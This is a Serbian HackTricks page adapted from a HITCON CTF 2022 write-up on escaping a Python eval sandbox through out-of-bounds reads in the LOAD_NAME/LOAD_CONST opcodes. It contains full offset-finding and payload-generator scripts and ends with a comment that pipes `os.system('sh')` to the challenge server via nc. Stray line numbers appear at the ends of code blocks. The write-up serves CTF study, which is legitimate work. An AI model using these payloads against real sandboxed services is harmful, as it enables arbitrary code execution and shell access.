# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Ove informacije su preuzete** [**iz ovog izveštaja**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Možemo koristiti OOB read funkciju u LOAD_NAME / LOAD_CONST opcode da dobijemo neki simbol u memoriji. Što znači korišćenje trikova kao što su `(a, b, c, ... stotine simbola ..., __getattribute__) if [] else [].__getattribute__(...)` da dobijemo simbol (kao što je ime funkcije) koji želite.

Zatim samo kreirajte svoj exploit.

### Overview <a href="#overview-1" id="overview-1"></a>

Izvorni kod je prilično kratak, sadrži samo 4 linije!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Možete uneti proizvoljan Python kod, i on će biti kompajliran u [Python kod objekat](https://docs.python.org/3/c-api/code.html). Međutim, `co_consts` i `co_names` tog kod objekta biće zamenjeni praznom tupelom pre nego što se eval-uju taj kod objekat.

Tako da na ovaj način, sve izraze koji sadrže konstante (npr. brojevi, stringovi itd.) ili imena (npr. promenljive, funkcije) mogu na kraju izazvati grešku segmentacije.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Kako se dešava greška segmentacije?

Hajde da počnemo sa jednostavnim primerom, `[a, b, c]` može biti kompajliran u sledeći bajtkod.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ali šta ako `co_names` postane prazan tuple? `LOAD_NAME 2` opcode se i dalje izvršava i pokušava da pročita vrednost sa te memorijske adrese sa koje bi prvobitno trebala da bude. Da, ovo je "karakteristika" čitanja van granica.

Osnovni koncept rešenja je jednostavan. Neki opkodi u CPython-u, na primer `LOAD_NAME` i `LOAD_CONST`, su ranjivi (?) na OOB čitanje.

Oni preuzimaju objekat sa indeksa `oparg` iz `consts` ili `names` tuple-a (to su `co_consts` i `co_names` pod haubom). Možemo se osloniti na sledeći kratak isječak o `LOAD_CONST` da vidimo šta CPython radi kada obrađuje `LOAD_CONST` opcode.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Na ovaj način možemo koristiti OOB funkciju da dobijemo "ime" sa proizvoljnog memorijskog ofseta. Da bismo bili sigurni koje ime ima i koji je njegov ofset, samo nastavite da pokušavate `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... I mogli biste pronaći nešto oko oparg > 700. Takođe možete pokušati da koristite gdb da pogledate raspored memorije, naravno, ali ne mislim da bi to bilo lakše?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Kada dobijemo te korisne ofsete za imena / konstante, kako _dobijamo_ ime / konstantu sa tog ofseta i koristimo je? Evo jednog trika za vas:\
Pretpostavimo da možemo dobiti `__getattribute__` ime sa ofseta 5 (`LOAD_NAME 5`) sa `co_names=()`, onda samo uradite sledeće:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Obratite pažnju da nije potrebno nazvati ga `__getattribute__`, možete ga nazvati nečim kraćim ili čudnijim

Razlog možete razumeti jednostavno gledajući njegov bajtkod:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Napomena da `LOAD_ATTR` takođe preuzima ime iz `co_names`. Python učitava imena sa iste pozicije ako je ime isto, tako da se drugi `__getattribute__` i dalje učitava sa offset=5. Koristeći ovu funkciju možemo koristiti proizvoljno ime kada je ime u memoriji u blizini.

Za generisanje brojeva bi trebalo da bude trivijalno:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Nisam koristio konstante zbog ograničenja dužine.

Prvo, ovde je skripta za pronalaženje tih offset-a imena.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
A sledeće je za generisanje pravog Python eksploita.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
U suštini, to radi sledeće stvari, za te stringove dobijamo ih iz `__dir__` metode:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{{#include ../../../banners/hacktricks-training.md}}
